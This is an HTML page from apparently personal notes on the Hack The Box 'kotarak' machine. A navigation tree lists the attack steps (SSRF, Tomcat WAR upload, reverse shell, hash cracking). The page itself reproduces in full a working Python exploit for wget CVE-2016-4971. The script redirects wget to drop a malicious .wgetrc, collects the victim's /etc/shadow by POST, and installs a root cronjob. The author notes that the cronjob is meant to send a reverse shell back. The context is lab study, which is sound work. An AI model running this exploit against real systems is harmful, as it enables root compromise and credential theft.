<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><strong>Index</strong></p>
<p><a href="HacktheBox--Linux_Boxes--kotarak.html">kotarak</a></p>

<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap.html">nmap</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--all_ports.html">all ports</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--targeted_ports.html">targeted ports</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--targeted_ports--8080.html">:8080</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--targeted_ports--8009.html">:8009</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--targeted_ports--60000.html">:60000</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page.html">kotarak web hosting page</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--mess_with_path.html">mess with path</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--burp.html">burp</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--localhost.html">localhost</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz.html">wfuzz</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost.html">wfuzz all ports of victim machine's localhost</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--22.html">:22</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--90.html">:90</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--110.html">:110</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--200.html">:200</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--320.html">:320</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--888.html">:888</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--888--doc=is.html">?doc=is </a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--888--doc=backup_SSRF.html">?doc=backup SSRF</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--888--doc=blah.html">?doc=blah</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--60000.html">:60000</a></li>
</ol>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold.html">initial foothold</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--Tomcat_login.html">Tomcat login</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--Tomcat_login--war_upload.html">war upload</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--Tomcat_login--reverse_shell.html">reverse shell</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--find_files_in_home_directory.html">find files in home directory</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--exfil_.bin_file.html">exfil .bin file</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--impacket.html">impacket</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--impacket--crack_some_ntlm_hashes.html">crack some ntlm hashes</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--impacket--crack_some_ntlm_hashes--hashcat.html">hashcat</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--impacket--crack_some_ntlm_hashes--crackstation_(online).html">crackstation (online)</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--privesc_to_atanis.html">privesc to atanis</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--privesc_to_atanis--user.txt.html">user.txt</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--privesc_to_atanis--app.log.html">app.log</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--arp_-a.html">arp -a </a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc.html">priv esc</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget.html">out of date wget</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--set_up_nc_listener_on_port_80.html">set up nc listener on port 80</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--exploit.html">exploit</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--exploit--part_1_prepare_malicious_.wgetrc_file_on_attack_machine.html">part 1: prepare malicious .wgetrc file on attack machine</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--exploit--part_2_set_up_ftp_server_on_port_21__(w-_authbind).html">part 2: set up ftp server on port 21  (w/ authbind)</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--exploit--part_3_exploit.py.html">part 3: exploit.py</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--root.html">root</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--kotarak--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Linux_Boxes--kotarak--lessons_learned.html">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>exploit</u></b></h1><span style="color:#24ff00;">lets mirror the exploit to our working directory and take a closer look at what it does</span><br /><img src="images/895-1.png" alt="images/895-1.png" /><br /><br /><img src="images/895-2.png" alt="images/895-2.png" /><br /><br /><img src="images/895-3.png" alt="images/895-3.png" /><br /><br /><span style="color:#24ff00;">lastly we want to copy the python </span><span style="color:#ffff00;">exploit</span><span style="color:#24ff00;"> and run the file so that every </span><span style="color:#ffff00;">2 minutes </span><span style="color:#24ff00;">when the victim's </span><span style="color:#ffa500;">cronjob</span><span style="color:#24ff00;"> is executed, it sends a</span><span style="color:#ffa500;"> reverse shell</span><span style="color:#24ff00;"> back to our attack machine</span><br /><br />---[ wget-exploit.py ]---<br /><br />#!/usr/bin/env python<br /><br />#<br /># Wget 1.18 &lt; Arbitrary File Upload Exploit<br /># Dawid Golunski<br /># dawid( at )legalhackers.com<br />#<br /># <a href="http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt">http://legalhackers.com/advisories/Wget-Arbitrary-File-Upload-Vulnerability-Exploit.txt</a><br />#<br /># CVE-2016-4971 <br />#<br /><br />import SimpleHTTPServer<br />import SocketServer<br />import socket;<br /><br />class wgetExploit(SimpleHTTPServer.SimpleHTTPRequestHandler):<br />   def do_GET(self):<br />       # This takes care of sending .wgetrc<br /><br />       print "We have a volunteer requesting " + self.path + " by GET :)\n"<br />       if "Wget" not in self.headers.getheader('User-Agent'):<br />	  print "But it's not a Wget :( \n"<br />          self.send_response(200)<br />          self.end_headers()<br />          self.wfile.write("Nothing to see here...")<br />          return<br /><br />       print "Uploading .wgetrc via ftp redirect vuln. It should land in /root \n"<br />       self.send_response(301)<br />       new_path = '%s'%('<a href="ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST,">ftp://anonymous@%s:%s/.wgetrc'%(FTP_HOST,</a> FTP_PORT) )<br />       print "Sending redirect to %s \n"%(new_path)<br />       self.send_header('Location', new_path)<br />       self.end_headers()<br /><br />   def do_POST(self):<br />       # In here we will receive extracted file and install a PoC cronjob<br /><br />       print "We have a volunteer requesting " + self.path + " by POST :)\n"<br />       if "Wget" not in self.headers.getheader('User-Agent'):<br />	  print "But it's not a Wget :( \n"<br />          self.send_response(200)<br />          self.end_headers()<br />          self.wfile.write("Nothing to see here...")<br />          return<br /><br />       content_len = int(self.headers.getheader('content-length', 0))<br />       post_body = self.rfile.read(content_len)<br />       print "Received POST from wget, this should be the extracted /etc/shadow file: \n\n---[begin]---\n %s \n---[eof]---\n\n" % (post_body)<br /><br />       print "Sending back a cronjob script as a thank-you for the file..." <br />       print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"<br />       self.send_response(200)<br />       self.send_header('Content-type', 'text/plain')<br />       self.end_headers()<br />       self.wfile.write(ROOT_CRON)<br /><br />       print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"<br /><br />       return<br /><br />HTTP_LISTEN_IP = '192.168.57.1'<br />HTTP_LISTEN_PORT = 80<br />FTP_HOST = '192.168.57.1'<br />FTP_PORT = 21<br /><br />ROOT_CRON = "* * * * * root /usr/bin/id &gt; /root/hacked-via-wget \n"<br /><br />handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)<br /><br />print "Ready? Is your FTP server running?"<br /><br />sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />result = sock.connect_ex((FTP_HOST, FTP_PORT))<br />if result == 0:<br />   print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)<br />else:<br />   print "FTP is down :( Exiting."<br />   exit(1)<br /><br />print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT<br /><br />handler.serve_forever()<br /><br /><br /><br /></div></div>
</body></html>